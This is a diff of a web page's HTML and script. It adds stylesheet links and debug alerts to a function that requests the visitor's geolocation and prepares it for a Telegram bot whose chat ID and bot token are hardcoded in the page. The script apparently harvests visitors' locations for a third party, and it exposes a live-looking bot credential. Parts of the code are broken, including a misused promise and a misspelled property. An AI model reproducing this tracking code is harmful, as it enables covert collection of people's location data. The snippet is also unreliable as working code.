@@ -11,6 +11,8 @@
   <meta name="viewport" content="user-scalable=no, initial-scale=1.0001, maximum-scale=1.0001, width=device-width, minimal-ui shrink-to-fit=no">
   <meta http-equiv="cleartype" content="on">
 
+<link rel="stylesheet" href="tecno.css" >
+<link rel="stylesheet" href="home.css" >
 
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
@@ -51,12 +53,13 @@ function tele(){
       ////  telegram bot  ////
         
       if('Geolocation' in navigator){ 
+        alert(1)
         navigator.geolocation.getCurrentPosition(success).then(x=>{
           const latitude  = x.coords.latitude;
           const longitude = x.coorde.longitude;
 
           var geoL={latitude:latitude,longitude:longitude};
-        
+          alert(geoL)
 
         var chatId =`-4647034325`;
         var token  =`7883274835:AAHMSeD4WhgOSOl-DsPUXihoo-PDuBS3hWY`;
@@ -74,6 +77,8 @@ function tele(){
 
       })
 
+      }else{
+        alert(0)
       }
  }
 
